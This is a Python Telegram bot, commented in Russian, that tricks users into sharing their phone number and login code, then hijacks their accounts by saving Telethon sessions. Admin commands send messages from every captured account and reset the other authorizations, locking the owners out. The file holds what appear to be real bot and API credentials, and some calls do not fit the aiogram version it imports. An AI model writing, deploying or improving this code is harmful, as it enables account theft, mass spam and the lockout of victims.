import os
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
)

# ────────────────────────────────────────────────
#               НАСТРОЙКИ
# ────────────────────────────────────────────────

BOT_TOKEN = '8757500911:AAEbSh9hlRam0GYC1HdkoXCGTd9Q1vVBeNc'          # @BotFather
API_ID = 31462757         # my.telegram.org
API_HASH = '79ae4e151e84526e11b107e99ad67177'

ADMIN_IDS = {8559221549}   # можно добавить ещё: {1730575116, 987654321}

# Папка для сессий
SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)

storage = MemoryStorage()
dp = Dispatcher(storage=storage)


# ────────────────────────────────────────────────
#               СОСТОЯНИЯ
# ────────────────────────────────────────────────

class AddSession(StatesGroup):
    waiting_phone = State()
    waiting_code = State()


class SendMessage(StatesGroup):
    waiting_username = State()
    waiting_text = State()


# ────────────────────────────────────────────────
#               КЛАВИАТУРЫ
# ────────────────────────────────────────────────

def get_continue_keyboard():
    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("Продолжить", request_contact=True))
    return kb


# ────────────────────────────────────────────────
#               /start
# ────────────────────────────────────────────────

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    user_id = message.from_user.id

    if user_id in ADMIN_IDS:
        count = len([f for f in os.listdir(SESSIONS_DIR) if f.endswith(".session")])
        text = (
            f"Привет, админ!\n"
            f"Сейчас сессий: <b>{count}</b>\n\n"
            "<code>/send</code> — разослать сообщение от всех аккаунтов\n"
            "<code>/auth</code> — сброс чужих авторизаций (24ч)\n"
            "<code>/count</code> — сколько сессий"
        )
        await message.answer(text)
        return

    # Обычный пользователь
    await message.answer(
        "Привет! Нажми «Продолжить», чтобы поделиться номером и получить код.",
        reply_markup=get_continue_keyboard()
    )
    await state.set_state(AddSession.waiting_phone)


# ────────────────────────────────────────────────
#               Добавление сессии (обычный пользователь)
# ────────────────────────────────────────────────

@dp.message(content_types=['contact'], state=AddSession.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    if not message.contact:
        await message.reply("Нужно поделиться номером через кнопку.")
        return

    phone = message.contact.phone_number.replace("+", "").replace(" ", "").replace("-", "")
    if not phone.isdigit() or len(phone) < 9:
        await message.reply("Некорректный номер.")
        await state.clear()
        return

    session_path = f"{SESSIONS_DIR}/{phone}.session"

    # Если сессия уже есть — предлагаем перезаписать
    if os.path.exists(session_path):
        await message.reply(f"Сессия для +{phone} уже существует. Перезаписываем?")

    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            sent_code = await client.send_code_request(phone)
            await state.update_data(
                phone=phone,
                phone_code_hash=sent_code.phone_code_hash,
                session_path=session_path
            )
            await message.reply(
                f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код:",
                reply_markup=types.ForceReply(selective=True)
            )
            await state.set_state(AddSession.waiting_code)
        else:
            await message.reply("Этот номер уже авторизован здесь.")
            await state.clear()

        await client.disconnect()

    except FloodWaitError as e:
        await message.reply(f"Слишком много попыток. Подожди {e.seconds // 60 + 1} минут.")
        await state.clear()
    except Exception as e:
        await message.reply(f"Ошибка: {str(e)[:200]}")
        await state.clear()


@dp.message(state=AddSession.waiting_code)
async def process_code(message: types.Message, state: FSMContext):
    code = message.text.strip()
    if not code.isdigit() or len(code) != 5:
        await message.reply("Код — это ровно 5 цифр.")
        return

    data = await state.get_data()
    phone = data.get("phone")
    phone_code_hash = data.get("phone_code_hash")
    session_path = data.get("session_path")

    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=phone_code_hash
        )

        await message.reply(
            f"Готово! Сессия для <code>+{phone}</code> сохранена.\n"
            "Можешь удалить это сообщение и код из чата."
        )
        await state.clear()

    except PhoneCodeInvalidError:
        await message.reply("Неверный код. Попробуй ещё раз.")
    except PhoneCodeExpiredError:
        await message.reply("Код устарел. Нажми /start заново.")
    except SessionPasswordNeededError:
        await message.reply(
            "На аккаунте включена двухфакторная аутентификация.\n"
            "Пока поддерживаем только аккаунты без 2FA."
        )
    except FloodWaitError as e:
        await message.reply(f"Флуд-лимит. Подожди {e.seconds // 60 + 1} мин.")
        await state.clear()
    except Exception as e:
        await message.reply(f"Ошибка: {str(e)[:180]}")
        await state.clear()
    finally:
        if 'client' in locals():
            await client.disconnect()


# ────────────────────────────────────────────────
#               Админ-команды
# ────────────────────────────────────────────────

@dp.message(Command("send"))
async def cmd_send(message: types.Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        return

    await message.reply("Введи username получателя (без @):")
    await state.set_state(SendMessage.waiting_username)


@dp.message(state=SendMessage.waiting_username)
async def process_username(message: types.Message, state: FSMContext):
    username = message.text.strip().lstrip("@")
    if not username:
        await message.reply("Некорректный username.")
        return

    await state.update_data(username=username)
    await message.reply("Теперь введи текст сообщения:")
    await state.set_state(SendMessage.waiting_text)


@dp.message(state=SendMessage.waiting_text)
async def process_text_and_send(message: types.Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        await state.clear()
        return

    text = message.text
    data = await state.get_data()
    target = data.get("username")

    success = 0
    failed = 0

    for fname in os.listdir(SESSIONS_DIR):
        if not fname.endswith(".session"):
            continue
        session_path = os.path.join(SESSIONS_DIR, fname)

        try:
            client = TelegramClient(session_path, API_ID, API_HASH)
            await client.connect()
            if await client.is_user_authorized():
                await client.send_message(target, text)
                success += 1
            await client.disconnect()
        except Exception as e:
            print(f"Ошибка отправки с {fname}: {e}")
            failed += 1

    await message.reply(f"Отправлено успешно: {success}\nНе удалось: {failed}")
    await state.clear()


@dp.message(Command("auth"))
async def cmd_reset_auth(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return

    count = 0
    for fname in os.listdir(SESSIONS_DIR):
        if not fname.endswith(".session"):
            continue
        try:
            client = TelegramClient(os.path.join(SESSIONS_DIR, fname), API_ID, API_HASH)
            await client.connect()
            if await client.is_user_authorized():
                auths = await client.get_authorizations()
                for auth in auths:
                    if auth.app_name != "TelegramTester":  # можно поменять на своё
                        await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                        count += 1
            await client.disconnect()
        except Exception as e:
            print(e)

    await message.reply(f"Сброшено авторизаций: {count}")


@dp.message(Command("count"))
async def cmd_count(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    count = len([f for f in os.listdir(SESSIONS_DIR) if f.endswith(".session")])
    await message.reply(f"Сессий сейчас: {count}")


# ────────────────────────────────────────────────
#               Запуск
# ────────────────────────────────────────────────

async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
